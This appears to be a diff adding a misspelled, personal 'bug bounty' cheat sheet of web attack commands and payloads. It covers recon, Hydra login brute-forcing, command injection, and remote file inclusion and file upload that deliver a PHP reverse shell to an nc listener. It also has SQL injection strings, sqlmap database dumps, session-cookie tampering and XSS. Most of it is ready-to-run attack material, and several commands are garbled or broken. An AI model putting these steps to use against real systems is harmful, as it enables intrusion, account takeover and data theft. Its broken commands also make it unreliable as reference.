@@ -1,0 +1,208 @@
+				ULTIMATE BUG BOUNTY
+
+_____sub domin finder____
+
+subfinder -d exmple.com -all -o subfinder.txt
+amass enum -d exmple.com -o amass.txt
+grep -oE "\b([a-zA-Z0-9_-]+\.)+exemple\.com\b' amass.txt > amass_final.txt       #for filter
+
+#dnsx is a fast and multi-purpose DNS toolkit allow to run multiple DNS queries of your choice with a list of user-supplied resolvers
+
+dnsx -d exmple.com -w /user/share/wordlists/amass/subdomins-top1mil-20000.txt -o dnsx.txt
+rm amass.txt
+cat amass_final.txt dnsx.txt subfinder.txt | sort -u >final_subdomins.txt
+cat final_subdomin.txt | httpx -o targets.txt -status-cod -location -title -tech-detect
+
+_______port scan_____
+#you have to scan thoes domin or subdomin that we found in final_subdomin.txt .mostly you have to scan 200 stutas domin
+
+sudo nmap -sS -sV exmple.com
+nabu -host exmple.cpm
+
+____DIRECTORY BRUTEFORCING____
+feroxbuster -u https://exmple.com/ -w /usr/share/wordlists/seclists/Discovery/web-content/raft-small-raft-small-files.txt
+
+feroxbuster -u https://exmple.com/ -w /usr/share/wordlists/seclists/Discovery/web-content/raft-small-directories.txt --threads 100 -C 404
+
+___FIREWALL CHECK___
+wafw00f exmple.com
+
+____AUTOMATIC VARNABEL SCAN____
+nuclei -terget exmple.com
+
+#it can scan a list of domin that you save in txt file.it can run auto scan into all domin at a time
+nuclei -l terget.txt
+
+____FIND HIDDEN PATH____
+katana -jc -u https://exmple.com -o katana.txt -aff
+
+_______BRUTEFORCE ATTACKS______
+
+hydra -l (give username or usrname list) -P /usr/share/wordlists/rockyou.txt (server name) http-get-form (the url or path  where we want to attack) :username=^USER^&password=^pass^&Login=Login:H=Coockie: (give the cookie request that you will get from burp suite):F=(failiar msg or username and/or password incorrect)
+
+_____COMMAND INJECTION____
+(what ever the input fild want give it ) | (ls,whoami,help,cd ,cat ,which php,python,ruby,socat)
+#use revshells.com to get payloads
+
+___AUTOMATION COMMAND INJECTION____
+cd commix
+python3 commix.py -u (terget page url) --cookie="(get cookie value from burp suite)" --data="(get from burp suite ,where you what to emplement the attack)"
+
+___CROSS SITE REQUEST FORGERY___
+#WHEN YOU WAT TO CHANGE SOMTHINK . TRY IN URL . IF NOT WORKINNG THEN GOTO BURPSUITE
+#TAKE THE REQUESST TO REPEATER AND CHANGE WHAT YOU WANT THEN  ADD <meta name="referrer" content="never"> THIS INTO REFERER SECTION IN LAST OF LINE .
+
+<meta name="referrer" content="never">
+
+____FILE INCLUSION____
+DO IN URL
+../../../../../../etc/passwd
+or
+..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+or
+../////..//////..//////.../////etc/passwd
+
+in url there have to (fil/?page=somthink ) after =../../../../../../ect/passwd   or   ..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+
+_____RFI____
+
+#collect PHP PentestMonkwy or PHP shell_exec paylod from revshells.com and pest into mousepad rev.php befor  save it must replase the cmd with bach 
+#in terminal 1 
+mousepad rev.php
+
+python3 -m http.server 
+
+#terminal 2
+nc -lvnp 1234
+
+#terminal 3
+ip add               #copy your ip and pest in url after =http://(your ip)
+
+http://(your ip):8000/rev.php     #add this after = in url
+or
+http://http://(your ip):8000/rev.php 
+or
+hhttp://(your ip):8000/rev.php
+or
+https://(your ip):8000/rev.php
+or
+hhttp://thttp://thttp://phttp://http:///http:///(your ip):8000/rev.php
+or 
+###CHECK PAYLOARALLTHETHINGS IN GITHUB
+
+____FILE UPLOAD_____
+#in website where have a section to upload option ,there you can perfom this attack
+
+#collect PHP PentestMonkwy or PHP shell_exec paylod from revshells.com and pest into mousepad rev.php befor  save it must replase the cmd with bach 
+	
+#in terminal 1 
+mousepad rev.php 
+
+cp rev.php rev2.php.jpeg
+
+python3 -m http.server 
+
+#terminal 2
+nc -lvnp 1234
+
+#in upload section upload rev.php file
+
+OR
+
+#IN UPLOAD SECTION UPLOAD rev2.php.jpeg
+
+or
+
+#in upload section upload rev.php file ,THEN GO TO BURPSUITE TAKE THE REQUEST ,SEND IT INTO REPEATER,THEN CHANGE THE CONTAIN TYPE  INTO  (IMAGE/JPG/PNG WHAT EVER THE WEBSITE ALLOW) AND SEND THE REQUEST TO SERVER
+
+OR
+
+
+
+#for execute  the attack uou have to find where the pictur or image save in server, to check that you 					 	can use file boutforse attack to fint the path where the image or life save as.
+
+feroxbuster -u https://exmple.com/ -w /usr/share/wordlists/seclists/Discovery/web-content/raft-small-directories.txt --threads 100 -C 404
+
+
+______SQL INJECTIONS_____ ERROR BASE SQL INJECTION________
+
+'OR 1=1-- -
+
+# TO SHOW THE NUMBER OF  COLUMN  USE 'ORDER BY 1# TO 'ORDER BY 100# ,IF ANY ORDER BY  GIGE ERROR THAT MEAN THE PREVIOS NUMBER OF ORDERBY IS THE COLUMN LENTH
+
+'ORDER BY 1#
+'ORDER BY 2#
+'ORDER BY 3#
+
+UNINON SELECT user, password FROM users#
+
+###CHECK SQL INJECTIO FROM PAYLOARALLTHETHINGS IN GITHUB
+#GET THE GET OR POST REQUEST INTO BURPSUITE SEND IT INTO REPEATR THEN IN THE SELECTIV THINK WHERE YOU WANT TO INJECT SQL ('+OR+1=1-- -) (+OR+1=1--+-)(1 ORDER BY 3#)(UNINON SELECT user, password FROM users#) PEST THAT WHICH IS INSIDE OF BRACET
+
+
+____BLIND SQL INJECTION_____
+
+'
+
+'OR 1=1-- -
+
+OR 1=1-- -
+
+'OR 1=1
+
+'AND sleep(5)#
+
+'OR sleep(5)-- -
+
+1'ORDER BY 1#
+
+'ORDER BY 3#
+
+1'AND LENGTH(database())=1#
+1'AND LENGTH(database())=2#
+1'AND LENGTH(database())=3#
+
+
+# TAKE THE REQUST FROM BURPSUITE WHERE YOU WANT TO ATTACK ,COPY THE REQUEST AND SAVE IT AND GIVE NAME request
+
+
+sqlmap -r request
+
+sqlmap -r request --dbms
+
+sqlmap -r request --dbs
+
+sqlmap -r request -D (database name) --tables
+
+sqlmap -r request -D (database name) -T (table name) --columns
+
+sqlmap -r request -D (database name) -T (table name) -C (column name),(column name) --dump
+
+sqlmap -r request -D (database name) -T (table name) --dump-all 
+
+
+
+#COLLECT URL AND COOOKIE VALU AND THE DATA FROM BURPSUITE OF THAT PAGE WHERE YOU WANT TO PERFOM ATTACK
+
+
+sqlmap -u (url) --cookie="(pest the cookie)" --data="(pest the data)" -p (perameter) --dbs
+
+sqlmap -u (url) --cookie="(pest the cookie)" --data="(pest the data)" -p (perameter) -D (database name) --dump-all
+
+
+_____WEAK SESSION IDS____
+
+#COLLECT SESSION ID  FROM COOKIE FROM BROWSER STORAGE ,COPY THAT ,ANG GO TO https://cyberchef.org/ AND DECODE IT.THEN ANALYS AND CHANGE THAT HOW YOU WANT. AND COPY THE CHANGED SESSION ID AND PEST INTO BROWSER COOKIE SESSION ID SECTION.
+
+____XSS (DOM BASED)____
+#FOR JAVASCRIPT
+#INPUT FILD THIK MOTO KAJ NA KORLE SE KHETRE AI ATTACK PERFOM KORA HOY eta 
+#TAKE THE REQUEST TO BURP SUITE AND CHECK WHAT YOU GET,
+#IN URL WHER THE INPUTED SECTION SHOWING IN BROWSER AFTER =
+<script>alert("HACKED")</script>
+
+#AFTER THE INPUT FINISH IN URL
+&document_write('...<script>alert(document.domain)</script>...');
+
+&document_write('...<script>alert(Hacked)</script>...');
+
